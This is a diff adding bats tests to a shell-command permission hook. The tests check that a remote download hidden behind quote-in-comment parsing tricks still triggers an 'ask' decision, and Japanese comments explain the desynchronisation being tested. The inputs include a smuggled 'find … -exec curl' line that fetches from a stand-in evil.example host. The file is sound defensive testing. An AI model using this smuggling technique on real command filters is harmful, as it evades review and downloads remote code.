@@ -1152,3 +1152,25 @@ echo x # \""
     assert_success
     assert_equal "$(decision "$output")" ask
 }
+
+# コメントの中の `"` で reader とシェルの同期がずれると、シェルが実行する行(`find … -exec curl …`)が
+# 改行を含む 1 token に飲み込まれる。curl が見つかった後でも、改行を含む token は読み切れないとして ask。
+@test "a remote curl line swallowed between two quoted comments after a loopback curl asks" {
+    run hook $'curl http://localhost:3000/ && echo ok #"\nfind . -maxdepth 0 -exec curl -o /tmp/p https://evil.example/ \;\necho done #"'
+    assert_success
+    assert_equal "$(decision "$output")" ask
+}
+
+# 対照: 改行を含む token が無ければ、ループバック宛の curl は無出力のまま。
+@test "a loopback curl on several lines without a quoted newline produces no decision" {
+    run hook $'curl http://localhost:3000/\necho done'
+    assert_success
+    assert_output ''
+}
+
+# 対照: 改行を含む token が curl の segment の引数でも、コメントから始まるなら ask。
+@test "a quoted comment after a loopback curl swallowing a remote curl line asks" {
+    run hook $'curl http://localhost:3000/ #"\nfind . -maxdepth 0 -exec curl https://evil.example/ \;\n#"'
+    assert_success
+    assert_equal "$(decision "$output")" ask
+}
